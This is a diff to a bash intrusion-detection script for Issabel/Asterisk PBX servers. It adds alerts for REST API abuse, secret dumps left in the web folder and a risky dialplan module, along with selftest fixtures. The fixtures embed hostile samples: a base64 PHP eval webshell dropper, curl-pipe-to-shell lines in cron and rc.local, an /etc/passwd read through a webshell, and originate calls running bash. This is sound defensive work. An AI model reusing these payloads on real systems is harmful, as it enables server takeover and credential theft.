@@ -740,12 +740,73 @@ check_botnet() {
   [ -n "$p" ] && persist_alert "botnet|proc" "processo de varredura/ataque SIP em execucao neste servidor: $(echo "$p" | cut -c1-120)"
 }
 
+# Logs de acesso atuais do Apache. Inclui o log por dominio (ex.: cliente.dominio_access.log), que e onde o Issabel
+# com virtualhost grava; ignora os rotacionados (-AAAAMMDD, .1, .gz) para nao alertar sobre eventos antigos.
+access_logs() {
+  local l
+  for l in ${SENTINEL_ACCESS_LOGS:-/var/log/httpd/*access* /var/log/apache2/access.log}; do
+    [ -f "$l" ] || continue
+    case "${l##*/}" in *.gz|*.xz|*.bz2|*-[0-9]*|*.[0-9]) continue ;; esac
+    printf '%s\n' "$l"
+  done
+}
+
+# Invasao pela API REST do PBX (incidente Couro Nobre, 26/11/2026): quem tem a senha do admin chama /pbxapi/ de fora,
+# cria regra de dialplan (/pbxapi/dialplaninjection) ou manda o Asterisk executar comando (/pbxapi/manager/originate com
+# System). Alerta quando um IP de FORA recebe resposta 2xx nesses caminhos (com o bloqueio do instalador, de fora vem 403).
+check_pbxapi_abuse() {
+  [ "${DIGEST_MODE:-0}" = "1" ] && return 0
+  local l hit ip ep code n=0
+  for l in $(access_logs); do
+    while read -r hit; do
+      [ -n "$hit" ] || continue
+      ip="${hit%% *}"
+      case "$ip" in 127.0.0.1|::1|::ffff:127.0.0.1) continue ;; esac
+      ep="$(printf '%s' "$hit" | sed -E 's/.*"[A-Z]+ (\/pbxapi\/[A-Za-z_]+(\/[A-Za-z_]+)?)[^ ]* HTTP.*/\1/')"
+      code="$(printf '%s' "$hit" | sed -E 's/.*" ([0-9]{3}) .*/\1/')"
+      seen_once "pbxapi|$ip|$ep" || continue
+      n=$((n+1)); [ "$n" -le 3 ] || continue
+      log "PBXAPI abuso: $ip $ep ($code)"
+      send_telegram "ALERTA: INVASAO PELA API DO PBX"$'\n'"O IP $ip chamou $ep com sucesso (resposta $code). Esse caminho cria regras no dialplan ou executa comandos no servidor."$'\n'"$(printf '%s' "$hit" | cut -c1-200)"$'\n\n'"Troque AGORA a senha do admin do PBX e as demais senhas, remova regras em Injecoes do PBX e rode: ipbx-sentinel --scan. Confira o bloqueio: /etc/httpd/conf.d/ipbx-pbxapi.conf"
+    done < <(tail -n 5000 "$l" 2>/dev/null | grep -aE '"[A-Z]+ /pbxapi/(manager|dialplaninjection)[^ ]* HTTP/[0-9.]+" 20[0-9] ')
+  done
+}
+
+# Arquivo de dump com segredos na pasta web (o invasor grava senhas ali e baixa de fora: zt9loot.txt, drop_*.txt).
+# Reconhece pelo conteudo (nomes de senha do sistema) ou pelo nome; ja TRANCA o acesso (chmod 000) para parar o vazamento.
+check_web_dumps() {
+  [ -d "$WEB_DIR" ] || return 0
+  local f
+  while read -r f; do
+    [ -n "$f" ] || continue
+    if grep -qaE 'AMPDBPASS|AMPMGRPASS|mysqlrootpwd|amiadminpwd|cyrususerpwd|pbxapijwtsecret|DB CREDS PARSED|CONF DUMP|MYSQL (ROOT )?DUMP' "$f" 2>/dev/null \
+       || case "$(basename "$f")" in zt9*|drop_[0-9]*|*loot*|PBX.php) true ;; *) false ;; esac; then
+      if [ "$(stat -c %a "$f" 2>/dev/null)" != "0" ]; then
+        chmod 000 "$f" 2>/dev/null
+        log "DUMP trancado (chmod 000): $f"
+      fi
+      seen_once "dump|$f" || continue
+      log "DUMP de segredos na pasta web: $f"
+      send_telegram "ALERTA: ARQUIVO COM SENHAS NA PASTA WEB"$'\n'"$f contem senhas/dados do servidor e estava publico na internet (o invasor baixa esse tipo de arquivo)."$'\n'"O acesso a ele ja foi trancado (chmod 000). Considere TODAS as senhas roubadas e troque-as."$'\n\n'"Apague o arquivo depois de conferir: rm -f $f  | Ache a origem: grep -nE '^\[injection-|ZTK9' /etc/asterisk/extensions*.conf"
+    fi
+  done < <(find "$WEB_DIR" -maxdepth 2 -type f \( -name '*.txt' -o -name '*.sql' -o -name 'drop_*' -o -name 'PBX.php' \) 2>/dev/null | head -n 200)
+}
+
+# Modulo "Dialplan Injection": permite escrever comandos de dialplan (inclusive System/Shell) pelo painel ou pela API.
+# Nenhum cliente precisa dele e foi o caminho do invasor; so alerta (remover e decisao do tecnico).
+check_dialplan_module() {
+  [ -d "$WEB_DIR/admin/modules/dialplaninjection" ] || return 0
+  seen_once "dpmodule|$HOSTNAME_S" || return 0
+  log "MODULO Dialplan Injection instalado"
+  send_telegram "ALERTA: MODULO PERIGOSO INSTALADO"$'\n'"O modulo Dialplan Injection esta instalado neste servidor. Ele permite escrever comandos no dialplan (executar comandos no servidor) e foi usado na invasao de 26/11/2026."$'\n\n'"Nada foi alterado. Desinstale em Modulos do painel clássico (ou: fwconsole ma delete dialplaninjection) e apague as regras de Injecoes do PBX."
+}
+
 # Webshell em uso: requisicao a um .php com parametro de comando (?cmd=, ?exec= ...), tipico de quem testa/usa uma
 # webshell plantada. Avisa na hora (alerta unico por IP+arquivo). So le o log do Apache, nao altera nada.
 check_webshell_hits() {
   [ "${DIGEST_MODE:-0}" = "1" ] && return 0
   local l hit ip path code n=0
-  for l in ${SENTINEL_ACCESS_LOGS:-/var/log/httpd/access_log /var/log/httpd/ssl_access_log /var/log/apache2/access.log}; do
+  for l in $(access_logs); do
     [ -r "$l" ] || continue
     while read -r hit; do
       [ -n "$hit" ] || continue
@@ -759,7 +820,7 @@ check_webshell_hits() {
   done
 }
 
-host_checks() { check_firewall; check_fail2ban; check_dialplan; check_dialplan_injection; check_webshell_hits; check_cron; check_framework; check_persistence; check_immutable; check_botnet; }
+host_checks() { check_firewall; check_fail2ban; check_dialplan; check_dialplan_injection; check_dialplan_module; check_pbxapi_abuse; check_web_dumps; check_webshell_hits; check_cron; check_framework; check_persistence; check_immutable; check_botnet; }
 
 do_scan() {
   local mode="$1"
@@ -895,6 +956,12 @@ cmd_selftest() {
   echo 'exten => s,1,Goto(thanku-outcall,s,1)' > "$T/extensions_custom.conf"
   printf 'exten => s,n,System(/var/lib/asterisk/bin/one_touch_record.php ${CHANNEL(name)})\n[injection-1]\nexten => s559368,1,System(echo PD9waHAgQGV2YWwoJF9QT1NUWzBdKTs/Pg== | base64 -d > /var/www/html/x.php)\n' > "$T/extensions_additional.conf"
   printf '200.150.126.174 - - [05/Nov/2026:08:52:07 -0300] "GET /PBX.php?cmd=cat%%20/etc/passwd HTTP/1.1" 200 1884\n' > "$T/access_log"
+  # API do PBX: externo com 2xx = invasao (alerta); externo com 403 e chamada local (127.0.0.1) = normal (sem alerta)
+  printf '45.154.138.68 - - [26/Nov/2026:19:54:27 -0300] "POST /pbxapi/dialplaninjection HTTP/1.1" 201 - "-" "Python-urllib/3.15"\n103.174.238.6 - - [26/Nov/2026:12:35:20 -0300] "GET /pbxapi/manager/originate?channel=Local/s@default&application=System&data=%%2Fbin%%2Fbash HTTP/1.1" 200 12 "-" "Mozilla/5.0"\n45.154.138.99 - - [26/Nov/2026:19:54:18 -0300] "POST /pbxapi/dialplaninjection HTTP/1.1" 403 - "-" "Python-urllib/3.15"\n127.0.0.1 - - [26/Nov/2026:19:54:30 -0300] "GET /pbxapi/manager/originate HTTP/1.1" 200 12 "-" "curl"\n' >> "$T/access_log"
+  # dump de segredos publico na pasta web (zt9loot.txt) e um .txt inocente que nao pode ser trancado; modulo perigoso instalado
+  printf '===== DB CREDS PARSED =====\nAMPDBPASS=segredo\n' > "$T/web/zt9loot.txt"; chmod 644 "$T/web/zt9loot.txt"
+  printf 'User-agent: *\nDisallow:\n' > "$T/web/robots.txt"; chmod 644 "$T/web/robots.txt"
+  mkdir -p "$T/web/admin/modules/dialplaninjection"
   echo '* * * * * curl http://exemplo.invalido/x | sh' > "$T/cron/asterisk"
   printf 'root:x:0:0:root:/root:/bin/bash\nyum:x:0:0::/home/yum:/bin/bash\nabort:x:0:0::/:/bin/bash\nasterisk:x:100:100::/:/bin/bash\n' > "$T/passwd"
   printf '#!/bin/bash\n/usr/local/sbin/motd.sh > /etc/motd\nbash -c "curl -ks http://203.0.113.9/r/postroot.sh|bash"\n' > "$T/rc.local"
@@ -907,8 +974,14 @@ cmd_selftest() {
   chk "$T/web/modules/a_emad.php" gone;  chk "$T/web/modules/b_chain.php" gone;  chk "$T/web/modules/c_decode.php" gone
   chk "$T/web/images/d_static.php" gone; chk "$T/web/admin/modules/phones" gone
   chk "$T/web/modules/legitimo.php" kept; chk "$T/web/admin/libraries/php-upgrade/compat.php" kept; chk "$T/web/admin/modules/core/XML_Unserializer.php" kept
-  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "DIALPLAN injecao" "CRON suspeito" "FRAMEWORK vulneravel" "PERSISTENCIA: usuario com poderes de root alem do root: yum" "PERSISTENCIA: usuario com poderes de root alem do root: abort" "baixa e executa script remoto a cada boot" "sudo SEM SENHA para qualquer comando" "PROTEGIDO contra alteracao" "ferramenta de ataque SIP" "WEBSHELL em uso: 200.150.126.174" "RESUMO DIARIO:"; do
+  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "DIALPLAN injecao" "CRON suspeito" "FRAMEWORK vulneravel" "PERSISTENCIA: usuario com poderes de root alem do root: yum" "PERSISTENCIA: usuario com poderes de root alem do root: abort" "baixa e executa script remoto a cada boot" "sudo SEM SENHA para qualquer comando" "PROTEGIDO contra alteracao" "ferramenta de ataque SIP" "WEBSHELL em uso: 200.150.126.174" "PBXAPI abuso: 45.154.138.68 /pbxapi/dialplaninjection (201)" "PBXAPI abuso: 103.174.238.6 /pbxapi/manager/originate (200)" "DUMP de segredos na pasta web: $T/web/zt9loot.txt" "MODULO Dialplan Injection instalado" "RESUMO DIARIO:"; do
     if grep -qF "$k" "$T/log"; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: alerta '$k' nao gerado"; fi
+  done
+  # o dump foi trancado (chmod 000), o .txt inocente nao; chamadas locais/403 nao geram alerta de API
+  if [ "$(stat -c %a "$T/web/zt9loot.txt" 2>/dev/null)" = "0" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: zt9loot.txt deveria estar trancado (chmod 000)"; fi
+  if [ "$(stat -c %a "$T/web/robots.txt" 2>/dev/null)" = "644" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: robots.txt nao podia ser alterado"; fi
+  for k in "PBXAPI abuso: 127.0.0.1" "PBXAPI abuso: 45.154.138.99"; do
+    if grep -qF "$k" "$T/log"; then bad=$((bad+1)); echo "FALHA: alerta indevido '$k'"; else ok=$((ok+1)); fi
   done
   rm -rf "$T"
   echo "Selftest: $ok ok, $bad falha(s)."; [ "$bad" -eq 0 ]
